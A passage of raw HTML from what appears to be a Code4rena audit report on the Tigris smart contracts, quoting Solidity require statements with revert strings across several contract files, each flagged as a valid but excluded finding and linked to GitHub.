class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">mintTime</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">300</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Recent update&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">350</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">assets</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">assets</span><span class=\"mtk1\">[</span><span class=\"mtk12\">assetsIndex</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">]] != </span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Already added&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">358</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">assets</span><span class=\"mtk1\">[</span><span class=\"mtk12\">assetsIndex</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">]] == </span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Not added&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">373</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">manager</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;!manager&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L63</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"222\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">GovNFT</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">51</span><span class=\"mtk1\">:           </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">counter</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">MAX</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Exceeds supply&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">65</span><span class=\"mtk1\">:           </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">) || </span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">() == </span><span class=\"mtk11\">owner</span><span class=\"mtk1\">(), </span><span class=\"mtk8\">&quot;NotBridge&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">66</span><span class=\"mtk1\">:           </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk7\">10000</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;BadID&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">94</span><span class=\"mtk1\">:           </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">) == </span><span class=\"mtk12\">from</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;!Owner&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">130</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Not bridging&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">132</span><span class=\"mtk1\">:              </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">() == </span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]), </span><span class=\"mtk8\">&quot;Not the owner&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">140</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">isTrustedAddress</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_dstChainId</span><span class=\"mtk1\">][</span><span class=\"mtk12\">targetAddress</span><span class=\"mtk1\">], </span><span class=\"mtk8\">&quot;!Trusted&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">174</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">() == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">endpoint</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;!Endpoint&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">185</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;NonblockingLzApp: caller must be app&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">194</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">isTrustedAddress</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_srcChainId</span><span class=\"mtk1\">][</span><span class=\"mtk12\">fromAddress</span><span class=\"mtk1\">], </span><span class=\"mtk8\">&quot;!TrustedAddress&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">209</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">payloadHash</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;NonblockingLzApp: no stored message&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">210</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_payload</span><span class=\"mtk1\">) == </span><span class=\"mtk12\">payloadHash</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;NonblockingLzApp: invalid payload&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">241</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_endpoint</span><span class=\"mtk1\">) != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;ZeroAddress&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">301</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">assets</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">assets</span><span class=\"mtk1\">[</span><span class=\"mtk12\">assetsIndex</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">]] != </span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Already added&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L51</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"223\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Lock</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">66</span><span class=\"mtk1\">:           </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_period</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">maxPeriod</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;MAX PERIOD&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">67</span><span class=\"mtk1\">:           </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_period</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">minPeriod</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;MIN PERIOD&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">68</span><span class=\"mtk1\">:           </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">allowedAssets</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">], </span><span class=\"mtk8\">&quot;!asset&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L66</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"224\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PairsContract</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">35</span><span class=\"mtk1\">:           </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_name</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;!Asset&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">50</span><span class=\"mtk1\">:           </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_assetName</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Already exists&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">51</span><span class=\"mtk1\">:           </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">bytes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_name</span><span class=\"mtk1\">).</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;No name&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">52</span><span class=\"mtk1\">:           </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_maxLeverage</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">_minLeverage</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">_minLeverage</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Wrong leverage values&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">75</span><span class=\"mtk1\">:           </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_name</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;!Asset&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">84</span><span class=\"mtk1\">:           </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_idToAsset</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">].</span><span class=\"mtk12\">maxLeverage</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">_idToAsset</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">].</span><span class=\"mtk12\">minLeverage</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Wrong leverage values&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">94</span><span class=\"mtk1\">:           </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_name</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;!Asset&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">95</span><span class=\"mtk1\">:           </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_baseFundingRate</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">maxBaseFundingRate</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;baseFundingRate too high&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">106</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_name</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;!Asset&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">117</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_name</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;!Asset&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">141</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_name</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;!Asset&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">157</span><span class=\"mtk1\">:              </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_idToOi</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">].</span><span class=\"mtk12\">longOi</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">_idToOi</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">].</span><span class=\"mtk12\">maxOi</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">_idToOi</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">].</span><span class=\"mtk12\">maxOi</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;MaxLongOi&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">177</span><span class=\"mtk1\">:              </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_idToOi</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">].</span><span class=\"mtk12\">shortOi</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">_idToOi</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">].</span><span class=\"mtk12\">maxOi</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">_idToOi</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">].</span><span class=\"mtk12\">maxOi</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;MaxShortOi&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">190</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">() == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">protocol</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;!Protocol&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/PairsContract.sol#L35</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"225\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">315</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_isMinter</span><span class=\"mtk1\">[</span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">()], </span><span class=\"mtk8\">&quot;!Minter&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Position.sol#L315</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"226\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Referrals</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">21</span><span class=\"mtk1\">:           </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_referral</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_hash</span><span class=\"mtk1\">] == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;Referral code already exists&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">81</span><span class=\"mtk1\">:           </span><span 